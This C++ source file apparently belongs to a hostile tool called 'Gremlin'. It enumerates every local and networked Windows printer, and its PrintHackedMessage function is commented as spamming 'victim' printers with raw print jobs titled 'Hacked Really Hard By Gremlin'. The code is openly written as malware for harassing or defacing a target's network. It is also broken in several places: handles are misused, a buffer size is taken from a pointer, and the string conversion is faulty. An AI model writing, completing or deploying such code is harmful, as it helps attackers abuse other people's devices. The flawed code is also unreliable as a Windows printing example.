#include "../Headers/Printers.h"

/// <summary>
/// reinterpretPrinterValueAddress is used to reintepret the pointer address of the values enumerated by EnumPrinters.
/// </summary>
/// <param name="printerInformation">LPPRINTER_INFO_2 Value</param>
/// <returns>The same value but reinterpreted as a std::string</returns>
std::string reinterpretPrinterValueAddress(LPWSTR& printerInformation) {
	std::string printersReinterpreted;
	for (int i = 0; i < wcslen(printerInformation); i++) {
		printersReinterpreted.append(reinterpret_cast<const char*>(printerInformation + i));
	}
	return printersReinterpreted;
}

/// <summary>
/// reinterpretPrinterValueAddress is used to reintepret the pointer address of the values enumerated by EnumPrinters.
/// </summary>
/// <param name="printerInformation">LPPRINTER_INFO_2 Value</param>
/// <returns>The same value but reinterpreted as a std::string</returns>
std::string reinterpretPrinterValueAddress(LPSTR& printerInformation) {
	std::string printersReinterpreted;
	for (int i = 0; i < strlen(printerInformation); i++) {
		printersReinterpreted.append(reinterpret_cast<const char*>(printerInformation + i));
	}
	return printersReinterpreted;
}

bool Printers::EnumeratePrintersInformation() {
	//Get default printer
	DWORD DefaultPrinterNameLength = 0;
	//Get buffer size
	GetDefaultPrinter(NULL, &DefaultPrinterNameLength); //Obtain DefaultPrinterNameLength
	char* DefaultPrinterNameBuffer = new char[DefaultPrinterNameLength]; //Allocate new char of size DefaultPrinterNameLength
	//Get value
	if (!(GetDefaultPrinterA(DefaultPrinterNameBuffer, &DefaultPrinterNameLength))) {
		if (::GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
#ifdef _DEBUG
			std::cout << "[ERROR] Failed to obtain Default Printer Name : " << "ERROR_INSUFFICIENT_BUFFER" << std::endl;
#endif
		}
		if (::GetLastError() == ERROR_FILE_NOT_FOUND) {
#ifdef _DEBUG
			std::cout << "[ERROR] Failed to obtain Default Printer Name : " << "ERROR_FILE_NOT_FOUND" << std::endl;
#endif
		}

	}
	else {
		//If the function succeeded
		this->DefaultPrinterName = DefaultPrinterNameBuffer;
		std::cout << "Default Printer Name : " << this->DefaultPrinterName << std::endl << std::endl;

	}


	//Enumerate All Printers with their details
	LPPRINTER_INFO_2 printerInformation = nullptr;
	DWORD pcbNeeded, pcReturned = { 0 }; //pcbNeeded : A pointer to a value that receives the number of bytes copied
									 //pcbReturned : A pointer to a value that received the number of PRINTER_INFO_5.
	//Get Buffer Size
	EnumPrinters(
		PRINTER_ENUM_LOCAL | PRINTER_ENUM_CONNECTIONS,
		NULL,
		2,
		(PBYTE)0,
		0,
		&pcbNeeded,
		&pcReturned
	);

	//Allocate memory for LPPRINTER_INFO_2
	if ((printerInformation = (LPPRINTER_INFO_2)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pcbNeeded)) == 0) exit(EXIT_FAILURE); //Exit Failure if not enough memory is available.
	//Enum our printers
	if (EnumPrintersA(PRINTER_ENUM_LOCAL | PRINTER_ENUM_CONNECTIONS, NULL, 2, (LPBYTE)printerInformation, pcbNeeded, &pcbNeeded, &pcReturned) == 0) {
		std::cout << "ENUMPRINTERS FAILED WITH ERROR : " << GetLastError() << std::endl;
		exit(EXIT_FAILURE);
	}

	for (DWORD dwItem = 0; dwItem < pcReturned; dwItem++) {
		//If printInformation has attributes PRINTER_ATTRIBUTE_SHARED then push it into our struct vector else we push "NONE"
		Printers.push_back({
			reinterpret_cast<char *>(printerInformation[dwItem].pPrinterName),
			printerInformation[dwItem].Attributes& PRINTER_ATTRIBUTE_SHARED ? reinterpret_cast<char *>(printerInformation[dwItem].pShareName) : "None", //PUSH SHARE NAME
			reinterpret_cast<char *>(printerInformation[dwItem].pPortName),
			reinterpret_cast<char *>(printerInformation[dwItem].pDriverName),
			reinterpret_cast<char *>(printerInformation[dwItem].pComment),
			reinterpret_cast<char *>(printerInformation[dwItem].pLocation),
			reinterpret_cast<char *>(printerInformation[dwItem].pPrintProcessor),
			printerInformation[dwItem].Status,
			printerInformation[dwItem].cJobs,
			printerInformation[dwItem].Priority,
			printerInformation[dwItem].AveragePPM,
			reinterpret_cast<char*>(printerInformation[dwItem].pPrinterName) == DefaultPrinterName ? true : false
			});
	}

	//Print our printer informations in a for loop just for testing purposes
#ifdef _DEBUG
	for (int i = 0; i < Printers.size(); i++) {
		std::cout << this->Printers[i] << std::endl;
	}
#endif
	return true;
}

///Spam print hacked message on all the Printers 
///in the victim location.

//Useful Documentations :
//https://docs.microsoft.com/en-us/troubleshoot/windows/win32/win32-raw-data-to-printer

void Printers::PrintHackedMessage(){
	//Check if we have more than 1 printers in the list.
	if(this->Printers.size() < 1) return;
	//Variables
	LPHANDLE hPrinter = nullptr;
	DWORD PrintJob = 0;
	DOC_INFO_1 docInformations;
	//Print
	for(PrinterInformations currentPrinter : 
		this->Printers){
			if(OpenPrinterA((char*)currentPrinter.PrinterName.c_str(), hPrinter, NULL) != 0){
				//Printer is opened and we now have a handle on it.
				//Add Job (Apparently it is not recommended to run AddJob directly on Windows 8 and Later OS)
				//So we'll use the StartDocPrinter along with StartPagePrinter, WritePrinter, EndPagePrinter, EndDocPrinter.
				
				//Fill the structure with data.
				docInformations.pDocName = TEXT("Hacked Really Hard By Gremlin"); //Document name.
				docInformations.pOutputFile = NULL; //Sets this to null if you send data to a printer.
				docInformations.pDatatype = TEXT("RAW"); //We sending RAW DATA to the printer.
				char* lpData = "DATASENTDATASENTDATASENTDATASENT";
				DWORD dwCount = sizeof(lpData) / sizeof(char);
				DWORD dwBytesWritten;
				//Inform the spooler the document is beginning.
				if((PrintJob = StartDocPrinter(&hPrinter, 1, (LPBYTE)&docInformations)) == 0){
					//If StartDocPrinter failed close the printer.
					ClosePrinter(hPrinter);
					return;
				}
				//Start a page.
				if(!StartPagePrinter(hPrinter)){
					//If StartPagePrinter function fails.
					EndDocPrinter(hPrinter); //Tell our spooler to stop the Doc Print.
					ClosePrinter(hPrinter); //Close our printer handle.
					return;
				}
				//Apparently there is a problem with the WritePrinter function, we'll still figure it out.
				if(!WritePrinter(hPrinter, (LPBYTE)&lpData, dwCount, &dwBytesWritten)){
					//If WritePrinter function fails.
					EndPagePrinter(hPrinter);
					EndDocPrinter(hPrinter);
					ClosePrinter(hPrinter);
					return;
				}
				//End the page
				if(!EndPagePrinter(hPrinter)){
					EndDocPrinter(hPrinter);
					ClosePrinter(hPrinter);
					return;
				}

				if(!EndDocPrinter(hPrinter)){
					ClosePrinter(hPrinter);
					return;
				}
			}
	}
}
